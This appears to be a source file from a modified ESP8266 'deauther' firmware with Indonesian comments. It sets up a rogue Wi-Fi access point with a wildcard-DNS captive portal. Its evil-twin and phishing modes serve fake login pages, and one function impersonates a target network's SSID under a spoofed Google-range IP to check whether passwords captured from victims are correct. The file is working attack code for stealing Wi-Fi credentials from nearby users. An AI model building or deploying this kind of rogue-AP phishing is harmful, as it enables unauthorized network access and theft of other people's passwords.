/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>
#include <EEPROM.h>
#include "Accesspoints.h"
#include "language.h"
#include "debug.h"
#include "settings.h"
#include "repeater.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "DisplayUI.h"

// --- Bagian Global ---
String MAC_;
String nama;
char eviltwinpath[32];
char pishingpath[32];
File webportal;
String tes_password;
String data_pishing;
String LOG;
String json_data;
bool hidden_target = false;
bool rogueap_continues = false;

extern bool progmemToSpiffs(const char* adr, int len, String path);
#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

// --- Definisi Mode & Settings ---
typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;

namespace wifi {
    wifi_mode_t   mode;
    ap_settings_t ap_settings;
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress netmask(255, 255, 255, 0);

    // Fungsi helper standar
    String getContentType(String filename) {
        if (server.hasArg("download")) return "application/octet-stream";
        if (filename.endsWith(".htm") || filename.endsWith(".html")) return "text/html";
        if (filename.endsWith(".css")) return "text/css";
        if (filename.endsWith(".js")) return "application/javascript";
        if (filename.endsWith(".json")) return "application/json";
        return "text/plain";
    }

    bool sendWebSpiffs(String path){
        if (!LittleFS.exists(path)) return false;
        String contentType = getContentType(path);
        File web = LittleFS.open(path, "r");
        server.streamFile(web, contentType);
        web.close();
        return true;
    }

    // Fungsi ini dipanggil di startAP
    void handleFileListJS() {
        server.send(200, "text/plain", "OK"); // Sesuai kebutuhan file manager lu
    }

    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
        dns.start(53, "*", ip);
        
        server.on("/filelist", handleFileListJS);
        server.on("/", HTTP_GET, []() {
            if(!attack.eviltwin && !attack.pishing){
                if(!sendWebSpiffs("/index.html")) server.send(200, "text/plain", "Web Files Missing");
            } else {
                if(attack.eviltwin) sendWebSpiffs("/eviltwin.html");
                if(attack.pishing) sendWebSpiffs("/rogue.html");
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;
    }

    void ethiddenAP() {
        WiFi.mode(WIFI_AP_STA);
        hidden_target = true;
        WiFi.softAPConfig(IPAddress(172, 217, 28, 254), IPAddress(172, 217, 28, 254), IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssids.rogue_wifi.c_str());
        dns.start(53, "*", IPAddress(172, 217, 28, 254));

        server.on("/result", [](){
            if (WiFi.status() != WL_CONNECTED) {
                // INI TEKS YANG LU MAU: Ganti Bahasa Inggris ke Indo
                server.send(200, "text/html", "<script>alert('Gagal! Cek Password lagi');history.back();</script>");
                tes_password = "";
            } else {
                server.send(200, "text/html", "<h2>Sukses!</h2>");
                ESP.restart();
            }
        });
        server.begin();
    }

    void begin() {
        mode = wifi_mode_t::off;
    }

    void update() {
        if (mode != wifi_mode_t::off) {
            server.handleClient();
            dns.processNextRequest();
        }
    }
}
